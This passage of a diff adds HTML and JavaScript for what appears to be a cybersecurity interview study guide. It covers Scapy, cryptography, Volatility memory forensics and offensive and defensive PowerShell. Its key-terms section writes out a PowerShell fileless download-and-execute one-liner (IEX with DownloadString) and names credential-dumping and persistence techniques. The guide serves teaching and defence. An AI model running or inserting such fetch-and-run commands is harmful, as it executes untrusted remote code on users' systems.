+      <div class="ch-tags"><span class="ch-tag">Python</span><span class="ch-tag">PowerShell</span><span class="ch-tag">Bash</span><span class="ch-tag">Memory Forensics</span></div>
+    </div>
+    <span class="ch-arrow">▼</span>
+  </div>
+  <div class="chapter-body">
+    <div class="tabs">
+      <button class="tab-btn active" onclick="switchTab(this,'sum')">Summary</button>
+      <button class="tab-btn" onclick="switchTab(this,'terms')">Key Terms</button>
+      <button class="tab-btn" onclick="switchTab(this,'qs')">Interview Qs</button>
+    </div>
+    <div class="tab-panel active" data-tab="sum">
+      <div class="sum-cards">
+        <div class="sum-card"><div class="sum-card-title">Scapy</div><div class="sum-card-text">Packet crafting and analysis. Stack layers with "/" operator: Ether()/IP()/TCP(). Sniff with callbacks. Custom protocol development. Requires elevated privileges for raw socket operations.</div></div>
+        <div class="sum-card"><div class="sum-card-title">PyCryptodome</div><div class="sum-card-text">AES (symmetric, CBC mode, random IV per encryption), SHA-256 (one-way hash, 256-bit output), RSA (sign with private / verify with public), scrypt (password key derivation, computationally expensive by design).</div></div>
+        <div class="sum-card"><div class="sum-card-title">Volatility</div><div class="sum-card-text">Memory forensics. Key plugins: pslist (processes), pstree (parent-child), netscan (connections), malfind (injected code/RWX memory), dlllist, cmdscan, hashdump. Analyze RAM dumps to find fileless malware.</div></div>
+        <div class="sum-card"><div class="sum-card-title">PowerShell — Offense</div><div class="sum-card-text">PowerSploit (Invoke-Shellcode, Invoke-Mimikatz), IEX download-execute in memory, Enter-PSSession lateral movement, WMI persistence, -ExecutionPolicy Bypass, PowerShell Remoting.</div></div>
+        <div class="sum-card"><div class="sum-card-title">PowerShell — Defense</div><div class="sum-card-text">Script block logging (Event ID 4104 — captures deobfuscated content even from encoded commands), transcription logging, module logging. Together: comprehensive audit trail of all PowerShell activity.</div></div>
+        <div class="sum-card"><div class="sum-card-title">Bash Red Team</div><div class="sum-card-text">Default on all Unix/Linux systems — no installation needed. Privilege escalation (SUID file finding), enumeration (port scan loops), post-exploitation (data exfiltration, cron persistence). Ubiquitous = always available.</div></div>
+      </div>
+    </div>
+    <div class="tab-panel" data-tab="terms">
+      <div class="terms-grid">
+        <div class="term-card"><span class="term-badge b-code">Python</span><div class="term-name">Scapy</div><div class="term-def">Python library for crafting, sending, and analyzing network packets. Stacks protocol layers with "/" operator. Supports sniffing with callbacks, custom protocol development, protocol fuzzing. Raw socket access = requires root.</div></div>
+        <div class="term-card"><span class="term-badge b-code">Crypto</span><div class="term-name">AES — Initialization Vector (IV)</div><div class="term-def">Random value used with key to ensure encrypting same plaintext produces different ciphertext each time. Prevents pattern analysis. Not secret — transmitted with ciphertext. Must be freshly generated per encryption operation.</div></div>
+        <div class="term-card"><span class="term-badge b-code">Forensics</span><div class="term-name">Volatility malfind</div><div class="term-def">Plugin finding injected code. Identifies VAD regions with RWX permissions and no corresponding on-disk file. Strong indicator of shellcode injection, process hollowing, or reflective DLL injection.</div></div>
+        <div class="term-card"><span class="term-badge b-code">PowerShell</span><div class="term-name">Script block logging (Event 4104)</div><div class="term-def">Logs all PowerShell code that executes including deobfuscated version. Base64 encoded commands are decoded before logging. Captures IEX, Invoke-Mimikatz, and other offensive PowerShell even when obfuscated.</div></div>
+        <div class="term-card"><span class="term-badge b-code">PowerShell</span><div class="term-name">IEX (Invoke-Expression)</div><div class="term-def">Executes string as PowerShell code. Combined with DownloadString for fileless payloads: IEX (New-Object Net.WebClient).DownloadString('URL'). Script executes in memory — never written to disk.</div></div>
+        <div class="term-card"><span class="term-badge b-code">Python</span><div class="term-name">RSA digital signatures</div><div class="term-def">Asymmetric. Sign: hash message with SHA-256, encrypt hash with private key. Verify: decrypt signature with public key, hash message independently, compare. Proves authorship and integrity without revealing private key.</div></div>
+      </div>
+    </div>
+    <div class="tab-panel" data-tab="qs">
+      <div class="q-list">
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">1</div><div class="q-text">What is Scapy and why is it useful for security professionals?</div><span class="q-diff easy">Easy</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>Scapy is a Python library for creating, sending, capturing, and analyzing network packets at a granular protocol-layer level. It gives security professionals the ability to work with network packets with complete control over every field in every protocol layer.</p><p>Key uses: <strong>Packet crafting</strong> — build custom packets by stacking protocol layers with the "/" operator (Ether()/IP()/TCP()). Set any field (source MAC, destination IP, TCP flags, payload). Test how network devices respond to specific, unusual, or malformed packets — invaluable for testing firewall rules and IDS signatures. <strong>Packet sniffing</strong> — capture live network traffic with callback functions that process each packet. Extract specific fields and analyze patterns. <strong>Protocol development</strong> — define new protocol headers with custom fields, bind to existing protocols, test interoperability. Replaces multiple tools (Wireshark-like analysis, packet injection, nmap-like scanning) with a single scriptable Python library. Security professionals use Scapy for simulating network attacks to test defenses, writing custom network scanning tools, and building proof-of-concept exploits for network vulnerabilities.</p></div></div>
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">2</div><div class="q-text">Why is PowerShell so frequently used in modern cyberattacks?</div><span class="q-diff easy">Easy</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>PowerShell is a powerful built-in Windows tool present on virtually every modern Windows system — no download or installation needed, making it ideal for LotL attacks. Since it's a legitimate Microsoft tool, basic security products don't block it, and execution appears as normal system activity.</p><p>Specific reasons: <strong>Fileless execution</strong> — IEX downloads and immediately executes scripts in memory without touching disk. No file means no hash for AV to match. <strong>Deep Windows API access</strong> — can call Windows APIs, interact with COM objects, manipulate registry, control WMI. <strong>Credential harvesting</strong> — Invoke-Mimikatz runs entirely in PowerShell memory, dumping passwords without dropping a binary. <strong>Lateral movement</strong> — Enter-PSSession connects to remote systems for remote command execution. <strong>WMI persistence</strong> — event subscriptions execute PowerShell scripts on system events (startup, login) without traditional executable files. <strong>Execution policy bypass</strong> — -ExecutionPolicy Bypass disables script restrictions (a configuration, not a security boundary). For defenders: enable script block logging (captures deobfuscated PowerShell including encoded commands), constrained language mode, and monitor for unusual PowerShell parent processes (Office spawning PowerShell is almost always malicious).</p></div></div>
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">3</div><div class="q-text">How would you use Volatility to investigate a Windows system for process injection?</div><span class="q-diff hard">Hard</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>Structured memory forensics investigation workflow. <strong>Step 1:</strong> volatility -f memory.raw --profile=Win7SP1x64 pslist — list all processes. Look for unexpected names, multiple instances of typically single-instance processes, unusual PIDs. <strong>Step 2:</strong> volatility ... pstree — show parent-child relationships. Legitimate svchost.exe is ALWAYS spawned by services.exe. If svchost.exe is spawned by explorer.exe, Word.exe, or PowerShell.exe — process hollowing confirmed. <strong>Step 3:</strong> volatility ... malfind -p [PID] — find VAD regions with RWX permissions and no corresponding on-disk file. These are where injected shellcode or reflective DLLs live. Output includes hex dump — look for MZ (4D 5A) PE header = executable loaded without being on disk. <strong>Step 4:</strong> volatility ... dlllist -p [PID] — check DLLs loaded by suspicious process. Legitimate DLLs load from C:\Windows\System32. DLL from %TEMP% or AppData = injection. <strong>Step 5:</strong> volatility ... netscan — correlate suspicious PIDs with outbound connections. C2 communication. <strong>Step 6:</strong> volatility ... cmdscan — recover PowerShell command history even if attacker cleared the console (commands existed in memory). Document all findings with timestamps and memory offsets for the incident report.</p></div></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+  </div><!-- /chapters-grid -->
+
+  <div class="no-results" id="noResults">
+    No chapters match your search. Try different keywords.
+  </div>
+
+</div><!-- /main -->
+
+<button class="scroll-top" id="scrollTop" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑</button>
+
+<script>
+// ── Toggle Chapter ──
+function toggleChapter(header){
+  const ch=header.closest('.chapter');
+  const isOpen=ch.classList.contains('open');
+  // Close all
+  document.querySelectorAll('.chapter.open').forEach(c=>{
+    c.classList.remove('open');
+  });
+  if(!isOpen){
+    ch.classList.add('open');
+    // Activate first tab if not already
+    const firstTab=ch.querySelector('.tab-btn');
+    if(firstTab&&!firstTab.classList.contains('active')){
+      switchTab(firstTab,'sum');
+    }
+    setTimeout(()=>{
+      ch.scrollIntoView({behavior:'smooth',block:'start'});
+    },100);
+  }
+  updateProgress();
+}
+
+// ── Switch Tab ──
+function switchTab(btn,tabId){
+  const body=btn.closest('.chapter-body');
+  body.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
+  body.querySelectorAll('.tab-panel').forEach(p=>p.classList.remove('active'));
+  btn.classList.add('active');
+  // find panel with matching data-tab
+  const panel=body.querySelector('[data-tab="'+tabId+'"]');
+  if(panel) panel.classList.add('active');
+}
+
+// ── Toggle Q ──
+function toggleQ(head){
+  const item=head.closest('.q-item');
+  item.classList.toggle('open');
+}
+
+// ── Toggle Dive ──
+function toggleDive(head){
+  const block=head.closest('.dive-block');
+  block.classList.toggle('open');
+}
+
+// ── Search ──
+function filterChapters(){
+  const q=document.getElementById('searchInput').value.toLowerCase().trim();
+  const chapters=document.querySelectorAll('.chapter');
+  let visible=0;
+  chapters.forEach(ch=>{
+    const searchText=ch.getAttribute('data-search')||'';
+    const title=ch.querySelector('.ch-title').textContent.toLowerCase();
+    const desc=ch.querySelector('.ch-desc').textContent.toLowerCase();
+    const match=!q||searchText.includes(q)||title.includes(q)||desc.includes(q);
+    ch.classList.toggle('hidden',!match);
+    if(match) visible++;
+  });
+  document.getElementById('noResults').classList.toggle('show',visible===0);
+}
+
+// ── Progress bar ──
+function updateProgress(){
+  const total=document.querySelectorAll('.chapter').length;
+  const opened=document.querySelectorAll('.chapter.open').length;
+  const pct=(opened/total)*100;
+  document.getElementById('progressFill').style.width=pct+'%';
+}
+
+// ── Scroll to top ──
+window.addEventListener('scroll',()=>{
+  document.getElementById('scrollTop').classList.toggle('show',window.scrollY>400);
+});
+</script>
+</body>
+</html>
